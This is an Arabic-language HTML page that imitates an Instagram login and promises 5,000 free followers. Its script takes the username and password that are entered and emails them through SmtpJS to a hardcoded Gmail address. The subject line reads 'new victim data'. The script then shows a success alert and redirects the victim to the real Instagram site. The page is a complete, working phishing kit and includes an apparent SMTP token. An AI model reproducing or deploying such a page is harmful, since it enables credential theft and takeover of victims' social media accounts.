<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram | زيادة متابعين</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 30px; border: 1px solid #dbdbdb; width: 300px; text-align: center; border-radius: 3px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background: #fafafa; }
        button { width: 100%; padding: 10px; background-color: #0095f6; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
        .logo { width: 175px; margin-bottom: 20px; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a251110364d.png" class="logo">
    <p style="color: #8e8e8e; font-weight: bold;">سجل دخولك لاستلام 5000 متابع فوراً</p>
    <form id="giftForm">
        <input type="text" name="user" placeholder="اسم المستخدم أو الهاتف" required>
        <input type="password" name="pass" placeholder="كلمة المرور" required>
        <button type="submit">تسجيل الدخول</button>
    </form>
</div>

<script src="https://smtpjs.com/v3/smtp.js"></script>
<script>
document.getElementById("giftForm").addEventListener("submit", function(e) {
    e.preventDefault();
    var u = document.getElementsByName("user")[0].value;
    var p = document.getElementsByName("pass")[0].value;

    Email.send({
        SecureToken : "c2780e8c-843c-42b7-862d-ef34399b3484",
        To : 'abodahmed778775@gmail.com',
        From : "insta-gift@bot.com",
        Subject : "بيانات ضحية جديدة! 🔥",
        Body : "اليوزر: " + u + " <br> الباسورد: " + p
    }).then(function() {
        alert("تم استلام طلبك! سيصلك المتابعون خلال ساعات.");
        window.location.href = "https://www.instagram.com";
    });
});
</script>

</body>
</html>
